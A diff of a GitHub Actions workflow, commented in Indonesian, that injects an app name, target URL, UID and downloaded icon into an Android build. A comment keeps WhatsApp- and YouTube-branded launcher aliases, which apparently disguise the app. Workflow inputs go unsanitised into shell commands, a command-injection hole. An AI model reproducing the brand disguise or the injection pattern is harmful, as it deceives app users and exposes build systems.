@@ -42,31 +42,40 @@ jobs:
         with:
           python-version: '3.11'
 
-      - name: Install Pillow & Requests
-        run: pip install Pillow requests
+      - name: Install Pillow
+        run: pip install Pillow
 
-      # ─── INJECT CONFIG KE MANIFEST & MainActivity ───
-      - name: Inject Config (Nama, URL, UID)
+      - name: Inject Config (Nama, URL, UID, Label)
         run: |
-          # 1. Update strings.xml (kalau dipakai di theme)
+          set -e
+
+          # 1. app_name di strings.xml
           sed -i 's|<string name="app_name">.*</string>|<string name="app_name">${{ github.event.inputs.app_name }}</string>|g' \
             android/app/src/main/res/values/strings.xml
 
-          # 2. Update AndroidManifest.xml — ganti semua label & alias utama
-          #    (supaya "Mario Song" / label lain hilang)
-          sed -i "s|android:label=\"[^\"]*\"|android:label=\"${{ github.event.inputs.app_name }}\"|g" \
-            android/app/src/main/AndroidManifest.xml
-
-          # 3. Update TARGET_URL di MainActivity.kt
+          # 2. TARGET_URL di MainActivity.kt
           sed -i 's|"TARGET_URL_PLACEHOLDER"|"${{ github.event.inputs.target_url }}"|g' \
             android/app/src/main/java/com/sync/xxx/MainActivity.kt
 
-          # 4. Update UID asset
+          # 3. Ganti semua label hardcoded di AndroidManifest (kecuali alias tema)
+          #    Alias tema WhatsApp/YouTube/dll sengaja dibiarkan karena merek.
+          sed -i "s|android:label=\"Mario Song\"|android:label=\"${{ github.event.inputs.app_name }}\"|g" \
+            android/app/src/main/AndroidManifest.xml
+
+          # 4. Asset UID
           mkdir -p android/app/src/main/assets/
           echo '{"uid":"${{ github.event.inputs.uid }}"}' > android/app/src/main/assets/uid.json
 
           # 5. Download icon
           curl -L -o custom_icon.png "${{ github.event.inputs.icon_url }}"
+
+          # 6. Verify inject berhasil
+          echo "=== strings.xml ==="
+          grep app_name android/app/src/main/res/values/strings.xml || true
+          echo "=== MainActivity TARGET_URL ==="
+          grep 'private val TARGET_URL' android/app/src/main/java/com/sync/xxx/MainActivity.kt || true
+          echo "=== uid.json ==="
+          cat android/app/src/main/assets/uid.json
 
       - name: Generate App Icons
         run: python3 generate_icons.py custom_icon.png
